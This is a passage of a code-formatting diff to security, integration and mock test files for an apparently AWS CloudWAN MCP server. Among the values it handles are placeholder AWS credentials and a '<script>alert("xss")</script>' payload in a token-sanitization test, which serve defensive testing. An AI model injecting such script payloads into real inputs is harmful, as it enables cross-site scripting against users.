+                "name": "large-segment-{:06d}",
+                "description": "A" * 1000,  # 1KB description
+                "require-attachment-acceptance": False,
             }
 
             current_size = len(json.dumps(large_policy))
             segment_count = 0
 
             while current_size < target_size and segment_count < 10000:
-                segment = {k: v.format(segment_count) if isinstance(v, str) else v
-                          for k, v in segment_template.items()}
-                large_policy['segments'].append(segment)
+                segment = {k: v.format(segment_count) if isinstance(v, str) else v for k, v in segment_template.items()}
+                large_policy["segments"].append(segment)
                 segment_count += 1
                 current_size = len(json.dumps(large_policy))
 
             # Test processing large policy
             import time
+
             start_time = time.time()
             result = await validate_cloudwan_policy(large_policy)
             processing_time = time.time() - start_time
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
+            assert parsed["success"] is True
 
             # Should not take excessive time (DoS prevention)
             assert processing_time < 60.0, f"{size_name} policy took {processing_time:.2f}s"
@@ -466,34 +447,32 @@
         ]
 
         policy_with_regex = {
-            'version': '2021.12',
-            'core-network-configuration': {
-                'asn-ranges': ['64512-64555'],
-                'edge-locations': [{'location': 'us-east-1', 'asn': 64512}]
+            "version": "2021.12",
+            "core-network-configuration": {
+                "asn-ranges": ["64512-64555"],
+                "edge-locations": [{"location": "us-east-1", "asn": 64512}],
             },
-            'attachment-policies': []
+            "attachment-policies": [],
         }
 
         for i, pattern in enumerate(dos_patterns):
-            policy_with_regex['attachment-policies'].append({
-                'rule-number': i + 1,
-                'conditions': [{
-                    'type': 'tag-value',
-                    'key': 'Name',
-                    'value': pattern,
-                    'operator': 'matches-regex'
-                }],
-                'action': {'association-method': 'constant', 'segment': 'test'}
-            })
+            policy_with_regex["attachment-policies"].append(
+                {
+                    "rule-number": i + 1,
+                    "conditions": [{"type": "tag-value", "key": "Name", "value": pattern, "operator": "matches-regex"}],
+                    "action": {"association-method": "constant", "segment": "test"},
+                }
+            )
 
         # Should complete within reasonable time
         import time
+
         start_time = time.time()
         result = await validate_cloudwan_policy(policy_with_regex)
         processing_time = time.time() - start_time
 
         parsed = json.loads(result)
-        assert parsed['success'] is True
+        assert parsed["success"] is True
         assert processing_time < 10.0, f"Regex DoS test took {processing_time:.2f}s"
 
     def _create_deeply_nested_structure(self, depth):
@@ -501,8 +480,8 @@
         if depth == 0:
             return "deep_value"
         return {
-            f'level_{depth}': self._create_deeply_nested_structure(depth - 1),
-            f'array_{depth}': [self._create_deeply_nested_structure(depth - 1)]
+            f"level_{depth}": self._create_deeply_nested_structure(depth - 1),
+            f"array_{depth}": [self._create_deeply_nested_structure(depth - 1)],
         }
 
 
@@ -516,79 +495,83 @@
         """Test prevention of credential exposure in responses."""
         # Simulate various credential patterns
         credential_patterns = [
-            'AKIA1234567890ABCDEF',  # AWS Access Key
-            'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',  # AWS Secret Key
-            'aws_session_token_example_1234567890',
-            'arn:aws:sts::123456789012:assumed-role/test-role/session',
+            "AKIA1234567890ABCDEF",  # AWS Access Key
+            "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",  # AWS Secret Key
+            "aws_session_token_example_1234567890",
+            "arn:aws:sts::123456789012:assumed-role/test-role/session",
         ]
 
         # Test that credentials don't appear in responses
-        with patch.dict(os.environ, {
-            'AWS_ACCESS_KEY_ID': credential_patterns[0],
-            'AWS_SECRET_ACCESS_KEY': credential_patterns[1],
-            'AWS_SESSION_TOKEN': credential_patterns[2]
-        }):
-            result = await aws_config_manager('get_current')
+        with patch.dict(
+            os.environ,
+            {
+                "AWS_ACCESS_KEY_ID": credential_patterns[0],
+                "AWS_SECRET_ACCESS_KEY": credential_patterns[1],
+                "AWS_SESSION_TOKEN": credential_patterns[2],
+            },
+        ):
+            result = await aws_config_manager("get_current")
             parsed = json.loads(result)
 
             response_text = json.dumps(parsed)
 
             self._assert_no_credential_leakage(credential_patterns, response_text, parsed)
+
     @pytest.mark.integration
     @pytest.mark.security
     @pytest.mark.asyncio
     async def test_temporary_credential_handling(self):
         """Test secure handling of temporary credentials."""
         temporary_creds = {
-            'AccessKeyId': 'ASIATEMP1234567890',
-            'SecretAccessKey': 'temp_secret_key_example',
-            'SessionToken': 'temp_session_token_very_long_example_1234567890',
-            'Expiration': datetime.now(timezone.utc).isoformat()
+            "AccessKeyId": "ASIATEMP1234567890",
+            "SecretAccessKey": "temp_secret_key_example",
+            "SessionToken": "temp_session_token_very_long_example_1234567890",
+            "Expiration": datetime.now(timezone.utc).isoformat(),
         }
 
-        with patch('boto3.Session') as mock_session:
-            mock_session.return_value.get_credentials.return_value.token = temporary_creds['SessionToken']
+        with patch("boto3.Session") as mock_session:
+            mock_session.return_value.get_credentials.return_value.token = temporary_creds["SessionToken"]
 
             result = await list_core_networks()
             response_text = json.dumps(json.loads(result))
 
             # Temporary credentials should not leak
-            assert temporary_creds['AccessKeyId'] not in response_text
-            assert temporary_creds['SecretAccessKey'] not in response_text
-            assert temporary_creds['SessionToken'] not in response_text
+            assert temporary_creds["AccessKeyId"] not in response_text
+            assert temporary_creds["SecretAccessKey"] not in response_text
+            assert temporary_creds["SessionToken"] not in response_text
 
     @pytest.mark.integration
     @pytest.mark.security
     @pytest.mark.asyncio
     async def test_role_assumption_security(self):
         """Test secure role assumption practices."""
-        test_role_arn = 'arn:aws:iam::123456789012:role/CloudWANTestRole'
+        test_role_arn = "arn:aws:iam::123456789012:role/CloudWANTestRole"
 
-        with patch('awslabs.cloudwan_mcp_server.server.boto3.Session') as mock_session:
+        with patch("awslabs.cloudwan_mcp_server.server.boto3.Session") as mock_session:
             # Mock STS assume role
             mock_sts = Mock()
             mock_sts.assume_role.return_value = {
-                'Credentials': {
-                    'AccessKeyId': 'ASIA1234567890ABCDEF',
-                    'SecretAccessKey': 'assumed_role_secret_key',
-                    'SessionToken': 'assumed_role_session_token',
-                    'Expiration': datetime.now(timezone.utc)
+                "Credentials": {
+                    "AccessKeyId": "ASIA1234567890ABCDEF",
+                    "SecretAccessKey": "assumed_role_secret_key",
+                    "SessionToken": "assumed_role_session_token",
+                    "Expiration": datetime.now(timezone.utc),
                 },
-                'AssumedRoleUser': {
-                    'AssumedRoleId': 'AROA1234567890ABCDEF:test-session',
-                    'Arn': f'{test_role_arn}/test-session'
-                }
+                "AssumedRoleUser": {
+                    "AssumedRoleId": "AROA1234567890ABCDEF:test-session",
+                    "Arn": f"{test_role_arn}/test-session",
+                },
             }
 
             mock_session.return_value.client.return_value = mock_sts
 
             # Test role assumption doesn't expose credentials
-            result = await aws_config_manager('validate_config')
+            result = await aws_config_manager("validate_config")
             parsed = json.loads(result)
 
             response_text = json.dumps(parsed)
-            assert 'assumed_role_secret_key' not in response_text
-            assert 'assumed_role_session_token' not in response_text
+            assert "assumed_role_secret_key" not in response_text
+            assert "assumed_role_session_token" not in response_text
 
     @pytest.mark.integration
     @pytest.mark.security
@@ -596,18 +579,17 @@
     async def test_credential_validation_security(self):
         """Test credential validation without exposure."""
         invalid_credentials = [
-            ('', ''),  # Empty credentials
-            ('invalid_access_key', 'invalid_secret_key'),  # Invalid format
-            ('AKIA1234567890ABCDEF', ''),  # Missing secret key
-            ('', 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'),  # Missing access key
+            ("", ""),  # Empty credentials
+            ("invalid_access_key", "invalid_secret_key"),  # Invalid format
+            ("AKIA1234567890ABCDEF", ""),  # Missing secret key
+            ("", "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),  # Missing access key
         ]
 
         for access_key, secret_key in invalid_credentials:
-            with patch.dict(os.environ, {
-                'AWS_ACCESS_KEY_ID': access_key,
-                'AWS_SECRET_ACCESS_KEY': secret_key
-            }, clear=False):
-                result = await aws_config_manager('validate_config')
+            with patch.dict(
+                os.environ, {"AWS_ACCESS_KEY_ID": access_key, "AWS_SECRET_ACCESS_KEY": secret_key}, clear=False
+            ):
+                result = await aws_config_manager("validate_config")
                 parsed = json.loads(result)
 
                 response_text = json.dumps(parsed)
@@ -625,44 +607,27 @@
         """Test session token handling security."""
         # Test various session token scenarios
         session_scenarios = [
-            {
-                'name': 'expired_token',
-                'token': 'expired_session_token_example',
-                'error_code': 'TokenRefreshRequired'
-            },
-            {
-                'name': 'invalid_token',
-                'token': 'invalid_session_token_format',
-                'error_code': 'InvalidToken'
-            },
-            {
-                'name': 'malformed_token',
-                'token': '<script>alert("xss")</script>',
-                'error_code': 'MalformedToken'
-            }
+            {"name": "expired_token", "token": "expired_session_token_example", "error_code": "TokenRefreshRequired"},
+            {"name": "invalid_token", "token": "invalid_session_token_format", "error_code": "InvalidToken"},
+            {"name": "malformed_token", "token": '<script>alert("xss")</script>', "error_code": "MalformedToken"},
         ]
 
         for scenario in session_scenarios:
-            with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+            with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
                 mock_client = Mock()
                 mock_client.list_core_networks.side_effect = ClientError(
-                    {
-                        'Error': {
-                            'Code': scenario['error_code'],
-                            'Message': "Session token validation failed"
-                        }
-                    },
-                    'ListCoreNetworks'
+                    {"Error": {"Code": scenario["error_code"], "Message": "Session token validation failed"}},
+                    "ListCoreNetworks",
                 )
                 mock_get_client.return_value = mock_client
 
                 result = await list_core_networks()
                 parsed = json.loads(result)
 
-                assert parsed['success'] is False
+                assert parsed["success"] is False
                 response_text = json.dumps(parsed)
 
                 # Session token should not appear in response
-                assert scenario['token'] not in response_text
+                assert scenario["token"] not in response_text
                 # XSS payload should be sanitized
-                assert '<script>' not in response_text
+                assert "<script>" not in response_text

--- cloudwan-mcp-server/tests/integration/test_server_performance.py
+++ cloudwan-mcp-server/tests/integration/test_server_performance.py
@@ -14,6 +14,7 @@
 
 
 """Performance and load testing for MCP server."""
+
 import json
 import pytest
 import time

--- cloudwan-mcp-server/tests/integration/test_simple_client.py
+++ cloudwan-mcp-server/tests/integration/test_simple_client.py
@@ -14,15 +14,15 @@
 
 
 #!/usr/bin/env python3
-"""Test simple AWS client async wrapper
-"""
+"""Test simple AWS client async wrapper"""
 
 import asyncio
 import os
 import sys
 
 
-sys.path.append('.')
+sys.path.append(".")
+
 
 async def test_simple_client():
     """Test AWS client wrapper directly"""
@@ -60,7 +60,7 @@
             print(f"Client has describe_global_networks: {hasattr(nm, 'describe_global_networks')}")
 
             # Test if we can call the method
-            describe_method = getattr(nm, 'describe_global_networks')
+            describe_method = getattr(nm, "describe_global_networks")
             print(f"Method type: {type(describe_method)}")
             print(f"Method is callable: {callable(describe_method)}")
 
@@ -73,7 +73,9 @@
     except Exception as e:
         print(f"❌ Error testing client: {e}")
         import traceback
+
         traceback.print_exc()
 
+
 if __name__ == "__main__":
     asyncio.run(test_simple_client())

--- cloudwan-mcp-server/tests/integration/test_simple_server.py
+++ cloudwan-mcp-server/tests/integration/test_simple_server.py
@@ -28,22 +28,25 @@
     type: str
     text: str
 
+
 class McpResponse(TypedDict, total=False):
     content: List[ContentItem]
     isError: bool
 
+
 # Create FastMCP server with minimal configuration
 mcp = FastMCP(
-    'CloudWAN MCP server for AWS CloudWAN network analysis',
+    "CloudWAN MCP server for AWS CloudWAN network analysis",
     dependencies=[
-        'boto3',
+        "boto3",
     ],
 )
 
-@mcp.tool(name='get_global_networks')
+
+@mcp.tool(name="get_global_networks")
 async def get_global_networks() -> str:
     """Get AWS CloudWAN Global Networks.
-    
+
     Lists all CloudWAN Global Networks in your AWS account.
     """
     try:
@@ -52,19 +55,19 @@
         import os
 
         # Get AWS session
-        profile = os.getenv('AWS_PROFILE')
-        region = os.getenv('AWS_DEFAULT_REGION', 'us-west-2')
+        profile = os.getenv("AWS_PROFILE")
+        region = os.getenv("AWS_DEFAULT_REGION", "us-west-2")
 
         if profile:
             session = boto3.Session(profile_name=profile)
         else:
             session = boto3.Session()
 
-        client = session.client('networkmanager', region_name=region)
+        client = session.client("networkmanager", region_name=region)
 
         # Get global networks
         response = client.describe_global_networks()
-        global_networks = response.get('GlobalNetworks', [])
+        global_networks = response.get("GlobalNetworks", [])
 
         if not global_networks:
             return "No CloudWAN Global Networks found in your account."
@@ -78,9 +81,9 @@
             result += f"   Created: {gn.get('CreatedAt', 'N/A')}\n"
 
             # Tags
-            tags = gn.get('Tags', [])
+            tags = gn.get("Tags", [])
             if tags:
-                tag_str = ', '.join([f"{t.get('Key')}={t.get('Value')}" for t in tags[:3]])
+                tag_str = ", ".join([f"{t.get('Key')}={t.get('Value')}" for t in tags[:3]])
                 result += f"   Tags: {tag_str}\n"
 
             result += "\n"
@@ -90,10 +93,11 @@
     except Exception as e:
         return f"Error retrieving global networks: {str(e)}"
 
-@mcp.tool(name='list_core_networks')
+
+@mcp.tool(name="list_core_networks")
 async def list_core_networks() -> str:
     """List AWS CloudWAN Core Networks.
-    
+
     Lists all CloudWAN Core Networks associated with Global Networks.
     """
     try:
@@ -101,19 +105,19 @@
         import os
 
         # Get AWS session
-        profile = os.getenv('AWS_PROFILE')
-        region = os.getenv('AWS_DEFAULT_REGION', 'us-west-2')
+        profile = os.getenv("AWS_PROFILE")
+        region = os.getenv("AWS_DEFAULT_REGION", "us-west-2")
 
         if profile:
             session = boto3.Session(profile_name=profile)
         else:
             session = boto3.Session()
 
-        client = session.client('networkmanager', region_name=region)
+        client = session.client("networkmanager", region_name=region)
 
         # Get core networks
         response = client.describe_core_networks()
-        core_networks = response.get('CoreNetworks', [])
+        core_networks = response.get("CoreNetworks", [])
 
         if not core_networks:
             return "No CloudWAN Core Networks found in your account."
@@ -128,9 +132,9 @@
             result += f"   Created: {cn.get('CreatedAt', 'N/A')}\n"
 
             # Tags
-            tags = cn.get('Tags', [])
+            tags = cn.get("Tags", [])
             if tags:
-                tag_str = ', '.join([f"{t.get('Key')}={t.get('Value')}" for t in tags[:3]])
+                tag_str = ", ".join([f"{t.get('Key')}={t.get('Value')}" for t in tags[:3]])
                 result += f"   Tags: {tag_str}\n"
 
             result += "\n"
@@ -140,6 +144,7 @@
     except Exception as e:
         return f"Error retrieving core networks: {str(e)}"
 
+
 def main() -> None:
     """Run the simplified CloudWAN MCP server."""
     try:
@@ -150,5 +155,6 @@
         print(f"Server error: {e}")
         sys.exit(1)
 
-if __name__ == '__main__':
+
+if __name__ == "__main__":
     main()

--- cloudwan-mcp-server/tests/integration/test_tool_chaining.py
+++ cloudwan-mcp-server/tests/integration/test_tool_chaining.py
@@ -14,6 +14,7 @@
 
 
 """Integration tests for tool chaining scenarios."""
+
 import json
 import pytest
 
@@ -40,18 +41,10 @@
         policy_data = json.loads(policy_result)
 
         # Step 3: Analyze routes
-        analyze_result = await analyze_segment_routes(
-            core_network_id,
-            "production",
-            "us-east-1"
-        )
+        analyze_result = await analyze_segment_routes(core_network_id, "production", "us-east-1")
         analyze_data = json.loads(analyze_result)
 
-        assert all([
-            list_data["success"],
-            policy_data["success"],
-            analyze_data["success"]
-        ])
+        assert all([list_data["success"], policy_data["success"], analyze_data["success"]])
 
     @pytest.mark.asyncio
     async def test_path_tracing_workflow(self, mock_aws_client):
@@ -67,22 +60,11 @@
         ip_data = json.loads(ip_result)
 
         # Trace path
-        trace_result = await trace_network_path(
-            "10.0.1.100",
-            "10.0.2.100",
-            region="us-east-1"
-        )
+        trace_result = await trace_network_path("10.0.1.100", "10.0.2.100", region="us-east-1")
         trace_data = json.loads(trace_result)
 
         # Analyze routes
-        route_result = await analyze_tgw_routes(
-            "tgw-rtb-1234567890abcdef0",
-            "us-east-1"
-        )
+        route_result = await analyze_tgw_routes("tgw-rtb-1234567890abcdef0", "us-east-1")
         route_data = json.loads(route_result)
 
-        assert all([
-            ip_data["success"],
-            trace_data["success"],
-            route_data["success"]
-        ])
+        assert all([ip_data["success"], trace_data["success"], route_data["success"]])

--- cloudwan-mcp-server/tests/integration/test_tools_validation.py
+++ cloudwan-mcp-server/tests/integration/test_tools_validation.py
@@ -38,7 +38,7 @@
         return False
 
     # Read and parse the server file
-    with open(server_file, 'r') as f:
+    with open(server_file, "r") as f:
         content = f.read()
 
     try:
@@ -64,7 +64,7 @@
         "analyze_segment_routes",
         "get_core_network_policy",
         "get_core_network_change_set",
-        "get_core_network_change_events"
+        "get_core_network_change_events",
     ]
 
     found_tools = []
@@ -82,12 +82,13 @@
         if isinstance(node, ast.FunctionDef):
             for decorator in node.decorator_list:
                 # Check for @mcp.tool() decorator
-                if (isinstance(decorator, ast.Call) and
-                    isinstance(decorator.func, ast.Attribute) and
-                    isinstance(decorator.func.value, ast.Name) and
-                    decorator.func.value.id == "mcp" and
-                    decorator.func.attr == "tool"):
-
+                if (
+                    isinstance(decorator, ast.Call)
+                    and isinstance(decorator.func, ast.Attribute)
+                    and isinstance(decorator.func.value, ast.Name)
+                    and decorator.func.value.id == "mcp"
+                    and decorator.func.attr == "tool"
+                ):
                     found_tools.append(node.name)
                     mcp_decorator_found = True
 
@@ -147,7 +148,7 @@
         "ClientError import": "from botocore.exceptions import ClientError" in content,
         "JSON error handling": "json.dumps" in content and "error" in content,
         "Direct client usage": "boto3.client" in content,
-        "Simple return strings": "-> str:" in content
+        "Simple return strings": "-> str:" in content,
     }
 
     print("\n🏗️ AWS Labs Compliance Patterns:")
@@ -171,7 +172,7 @@
         "Dynamic registry": "DynamicToolRegistry" in content,
         "Complex abstractions": "BaseMCPTool" in content,
         "Pydantic models": "from pydantic" in content,
-        "Tool factory": "ToolFactory" in content
+        "Tool factory": "ToolFactory" in content,
     }
 
     print("\n🚫 Complexity Anti-Patterns (should be absent):")
@@ -183,7 +184,7 @@
             success = False
 
     # Final validation
-    print(f"\n{'='*50}")
+    print(f"\n{'=' * 50}")
     if success:
         print("🎉 VALIDATION PASSED: CloudWAN MCP Server is AWS Labs compliant!")
         print("✅ All 16 tools converted to simple FastMCP decorators")
@@ -195,6 +196,7 @@
 
     return success
 
+
 if __name__ == "__main__":
     success = validate_tools()
     sys.exit(0 if success else 1)

--- cloudwan-mcp-server/tests/mocking/__init__.py
+++ cloudwan-mcp-server/tests/mocking/__init__.py
@@ -21,9 +21,4 @@
 
 from .aws import AWSServiceMocker, AWSErrorCatalog, create_service_mocker, create_error_fixture
 
-__all__ = [
-    'AWSServiceMocker',
-    'AWSErrorCatalog', 
-    'create_service_mocker',
-    'create_error_fixture'
-]
\ No newline at end of file
+__all__ = ["AWSServiceMocker", "AWSErrorCatalog", "create_service_mocker", "create_error_fixture"]

--- cloudwan-mcp-server/tests/mocking/aws.py
+++ cloudwan-mcp-server/tests/mocking/aws.py
@@ -27,19 +27,20 @@
 
 class MockingSecurityError(Exception):
     """Raised when mocking security boundary violations are detected."""
+
     pass
 
 
 class AWSServiceMocker:
     """Hierarchical AWS service mocker with configurable behavior.
-    
+
     This class provides a structured approach to mocking AWS service clients
     with realistic responses and error scenarios.
     """
 
     def __init__(self, service_name: str, region: str = "us-east-1"):
         """Initialize AWS service mocker.
-        
+
         Args:
             service_name: AWS service name (e.g., 'networkmanager', 'ec2')
             region: AWS region for service client
@@ -73,7 +74,7 @@
                     "GlobalNetworkId": "global-network-1234567890abcdef0",
                     "State": "AVAILABLE",
                     "Description": "Test core network",
-                    "CreatedAt": "2023-01-01T00:00:00Z"
+                    "CreatedAt": "2023-01-01T00:00:00Z",
                 }
             ]
         }
@@ -85,7 +86,7 @@
                     "GlobalNetworkId": "global-network-1234567890abcdef0",
                     "State": "AVAILABLE",
                     "Description": "Test global network",
-                    "CreatedAt": "2023-01-01T00:00:00Z"
+                    "CreatedAt": "2023-01-01T00:00:00Z",
                 }
             ]
         }
@@ -96,38 +97,25 @@
                 "PolicyVersionId": 1,
                 "PolicyDocument": {
                     "version": "2021.12",
-                    "core-network-configuration": {
-                        "vpn-ecmp-support": False,
-                        "asn-ranges": ["64512-65534"]
-                    },
-                    "segments": [
-                        {"name": "production", "require-attachment-acceptance": False}
-                    ]
+                    "core-network-configuration": {"vpn-ecmp-support": False, "asn-ranges": ["64512-65534"]},
+                    "segments": [{"name": "production", "require-attachment-acceptance": False}],
                 },
                 "Description": "Test policy",
-                "CreatedAt": "2023-01-01T00:00:00Z"
+                "CreatedAt": "2023-01-01T00:00:00Z",
             }
         }
 
         # Change Set
         self._client.get_core_network_change_set.return_value = {
             "CoreNetworkChanges": [
-                {
-                    "Type": "SEGMENT_MAPPING_CREATE",
-                    "Action": "CREATE",
-                    "Identifier": "segment-mapping-1"
-                }
+                {"Type": "SEGMENT_MAPPING_CREATE", "Action": "CREATE", "Identifier": "segment-mapping-1"}
             ]
         }
 
         # Change Events
         self._client.get_core_network_change_events.return_value = {
             "CoreNetworkChangeEvents": [
-                {
-                    "Type": "POLICY_VERSION_CREATED",
-                    "Status": "COMPLETED",
-                    "EventTime": "2023-01-01T00:00:00Z"
-                }
+                {"Type": "POLICY_VERSION_CREATED", "Status": "COMPLETED", "EventTime": "2023-01-01T00:00:00Z"}
             ]
         }
 
@@ -140,7 +128,7 @@
                     "State": "available",
                     "CidrBlock": "10.0.0.0/16",
                     "IsDefault": False,
-                    "Tags": [{"Key": "Name", "Value": "test-vpc"}]
+                    "Tags": [{"Key": "Name", "Value": "test-vpc"}],
                 }
             ]
         }
@@ -154,36 +142,36 @@
                 "FirewallArn": "arn:aws:network-firewall:us-east-1:123456789012:firewall/test-firewall",
                 "VpcId": "vpc-12345",
                 "SubnetMappings": [{"SubnetId": "subnet-12345"}],
-                "FirewallPolicyArn": "arn:aws:network-firewall:us-east-1:123456789012:firewall-policy/test-policy"
+                "FirewallPolicyArn": "arn:aws:network-firewall:us-east-1:123456789012:firewall-policy/test-policy",
             },
-            "FirewallStatus": {
-                "Status": "READY"
-            }
+            "FirewallStatus": {"Status": "READY"},
         }
-        
+
         # Default firewall policy response
         self._client.describe_firewall_policy.return_value = {
             "FirewallPolicy": {
                 "StatelessRuleGroups": [
-                    {"ResourceArn": "arn:aws:network-firewall:us-east-1:123456789012:stateless-rulegroup/test-stateless"}
+                    {
+                        "ResourceArn": "arn:aws:network-firewall:us-east-1:123456789012:stateless-rulegroup/test-stateless"
+                    }
                 ],
                 "StatefulRuleGroups": [
                     {"ResourceArn": "arn:aws:network-firewall:us-east-1:123456789012:stateful-rulegroup/test-stateful"}
                 ],
                 "StatelessDefaultActions": ["aws:pass"],
-                "StatelessFragmentDefaultActions": ["aws:drop"]
+                "StatelessFragmentDefaultActions": ["aws:drop"],
             }
         }
-        
+
         # Default rule group response
         self._client.describe_rule_group.return_value = {
             "RuleGroup": {
                 "RulesSource": {
-                    "RulesString": "alert tcp any any -> any 80 (msg:\"HTTP traffic detected\"; sid:1; rev:1;)"
+                    "RulesString": 'alert tcp any any -> any 80 (msg:"HTTP traffic detected"; sid:1; rev:1;)'
                 }
             }
         }
-        
+
         # Default logging configuration
         self._client.describe_logging_configuration.return_value = {
             "LoggingConfiguration": {
@@ -191,9 +179,7 @@
                     {
                         "LogType": "FLOW",
                         "LogDestinationType": "CloudWatchLogs",
-                        "LogDestination": {
-                            "logGroup": "/aws/network-firewall/test-firewall"
-                        }
+                        "LogDestination": {"logGroup": "/aws/network-firewall/test-firewall"},
                     }
                 ]
             }
@@ -207,16 +193,19 @@
             "results": [
                 [
                     {"field": "@timestamp", "value": "2023-01-01T12:00:00.000Z"},
-                    {"field": "@message", "value": "FLOW srcaddr=10.0.1.100 dstaddr=10.0.2.200 srcport=12345 dstport=80 protocol=6 action=ALLOW"}
+                    {
+                        "field": "@message",
+                        "value": "FLOW srcaddr=10.0.1.100 dstaddr=10.0.2.200 srcport=12345 dstport=80 protocol=6 action=ALLOW",
+                    },
                 ]
-            ]
+            ],
         }
         self._client.describe_log_groups.return_value = {
             "logGroups": [
                 {
                     "logGroupName": "/aws/network-firewall/test-firewall",
                     "creationTime": 1672531200000,
-                    "retentionInDays": 30
+                    "retentionInDays": 30,
                 }
             ]
         }
@@ -226,26 +215,26 @@
         # Default empty responses for unknown services
         pass
 
-    def configure_core_networks(self, networks: List[Dict[str, Any]]) -> 'AWSServiceMocker':
+    def configure_core_networks(self, networks: List[Dict[str, Any]]) -> "AWSServiceMocker":
         """Configure core network responses.
-        
+
         Args:
             networks: List of core network configurations
-            
+
         Returns:
             Self for method chaining
         """
         self._client.list_core_networks.return_value = {"CoreNetworks": networks}
         return self
 
-    def configure_error(self, error_code: str, message: str = None, operation: str = None) -> 'AWSServiceMocker':
+    def configure_error(self, error_code: str, message: str = None, operation: str = None) -> "AWSServiceMocker":
         """Configure service to return specific error.
-        
+
         Args:
             error_code: AWS error code (e.g., 'AccessDenied')
             message: Optional custom error message
             operation: Operation that should fail
-            
+
         Returns:
             Self for method chaining
         """
@@ -253,25 +242,26 @@
             message = f"Test error message for {error_code}"
 
         error_response = {
-            'Error': {
-                'Code': error_code,
-                'Message': message
+            "Error": {"Code": error_code, "Message": message},
+            "ResponseMetadata": {
+                "RequestId": "test-request-id-123",
+                "HTTPStatusCode": self._get_http_status_for_error(error_code),
             },
-            'ResponseMetadata': {
-                'RequestId': 'test-request-id-123',
-                'HTTPStatusCode': self._get_http_status_for_error(error_code)
-            }
         }
 
-        client_error = ClientError(error_response, operation or 'TestOperation')
+        client_error = ClientError(error_response, operation or "TestOperation")
 
         # Configure all methods to raise this error
         if operation:
             getattr(self._client, operation).side_effect = client_error
         else:
             # Configure common operations
-            for method in ['list_core_networks', 'describe_global_networks',
-                          'get_core_network_policy', 'describe_vpcs']:
+            for method in [
+                "list_core_networks",
+                "describe_global_networks",
+                "get_core_network_policy",
+                "describe_vpcs",
+            ]:
                 if hasattr(self._client, method):
                     getattr(self._client, method).side_effect = client_error
 
@@ -280,26 +270,27 @@
     def _get_http_status_for_error(self, error_code: str) -> int:
         """Map AWS error codes to HTTP status codes."""
         error_mapping = {
-            'AccessDenied': 403,
-            'ResourceNotFoundException': 404,
-            'ThrottlingException': 429,
-            'ValidationException': 400,
-            'InternalFailure': 500,
-            'ServiceUnavailable': 503
+            "AccessDenied": 403,
+            "ResourceNotFoundException": 404,
+            "ThrottlingException": 429,
+            "ValidationException": 400,
+            "InternalFailure": 500,
+            "ServiceUnavailable": 503,
         }
         return error_mapping.get(error_code, 400)
 
-    def configure_regional_behavior(self, region_responses: Dict[str, Any]) -> 'AWSServiceMocker':
+    def configure_regional_behavior(self, region_responses: Dict[str, Any]) -> "AWSServiceMocker":
         """Configure region-specific responses.
-        
+
         Args:
             region_responses: Mapping of regions to response configurations
-            
+
         Returns:
             Self for method chaining
         """
+
         def region_aware_response(method_name, *args, **kwargs):
-            region = kwargs.get('region') or self.region
+            region = kwargs.get("region") or self.region
             if region in region_responses:
                 return region_responses[region].get(method_name, {})
             return {}
@@ -308,9 +299,10 @@
         for method in self._client_methods:
             if hasattr(self._client, method):
                 original_method = getattr(self._client, method)
-                if hasattr(original_method, 'return_value'):
-                    setattr(self._client, method,
-                           Mock(side_effect=lambda *a, **k: region_aware_response(method, *a, **k)))
+                if hasattr(original_method, "return_value"):
+                    setattr(
+                        self._client, method, Mock(side_effect=lambda *a, **k: region_aware_response(method, *a, **k))
+                    )
 
         return self
 
@@ -322,7 +314,7 @@
 
 class AWSErrorCatalog:
     """Security-hardened AWS error catalog for comprehensive testing.
-    
+
     Features:
     - Information disclosure prevention
     - Security boundary enforcement
@@ -332,89 +324,89 @@
 
     # Security-hardened error messages (no system internals exposed)
     SAFE_MESSAGES = {
-        'AccessDenied': 'Authorization failed for requested operation',
-        'ResourceNotFoundException': 'Requested resource could not be located',
-        'ThrottlingException': 'Request rate limit exceeded - please retry with backoff',
-        'ValidationException': 'Request validation failed - check input parameters',
-        'InternalFailure': 'Service unavailable - please try again later',
-        'ServiceUnavailable': 'Service temporarily unavailable - please retry',
-        'NetworkingError': 'Network connectivity issue detected',
-        'TimeoutException': 'Request timeout - operation did not complete in time'
+        "AccessDenied": "Authorization failed for requested operation",
+        "ResourceNotFoundException": "Requested resource could not be located",
+        "ThrottlingException": "Request rate limit exceeded - please retry with backoff",
+        "ValidationException": "Request validation failed - check input parameters",
+        "InternalFailure": "Service unavailable - please try again later",
+        "ServiceUnavailable": "Service temporarily unavailable - please retry",
+        "NetworkingError": "Network connectivity issue detected",
+        "TimeoutException": "Request timeout - operation did not complete in time",
     }
 
     # Standard AWS error codes and scenarios with security boundaries
     COMMON_ERRORS = {
-        'access_denied': {
-            'Code': 'AccessDenied',
-            'Message': 'Authorization failed for requested operation',
-            'HTTPStatusCode': 403,
-            'SecurityBoundary': 'AUTH_FAILURE',
-            'SanitizedDetails': 'IAM permission validation failed'
+        "access_denied": {
+            "Code": "AccessDenied",
+            "Message": "Authorization failed for requested operation",
+            "HTTPStatusCode": 403,
+            "SecurityBoundary": "AUTH_FAILURE",
+            "SanitizedDetails": "IAM permission validation failed",
+        },
+        "resource_not_found": {
+            "Code": "ResourceNotFoundException",
+            "Message": "Requested resource could not be located",
+            "HTTPStatusCode": 404,
+            "SecurityBoundary": "RESOURCE_ACCESS",
+            "SanitizedDetails": "Resource identifier not found in accessible scope",
         },
-        'resource_not_found': {
-            'Code': 'ResourceNotFoundException',
-            'Message': 'Requested resource could not be located',
-            'HTTPStatusCode': 404,
-            'SecurityBoundary': 'RESOURCE_ACCESS',
-            'SanitizedDetails': 'Resource identifier not found in accessible scope'
+        "throttling": {
+            "Code": "ThrottlingException",
+            "Message": "Request rate limit exceeded - please retry with backoff",
+            "HTTPStatusCode": 429,
+            "SecurityBoundary": "RATE_LIMIT",
+            "SanitizedDetails": "API rate limiting active for protection",
         },
-        'throttling': {
-            'Code': 'ThrottlingException',
-            'Message': 'Request rate limit exceeded - please retry with backoff',
-            'HTTPStatusCode': 429,
-            'SecurityBoundary': 'RATE_LIMIT',
-            'SanitizedDetails': 'API rate limiting active for protection'
+        "validation_error": {
+            "Code": "ValidationException",
+            "Message": "Request validation failed - check input parameters",
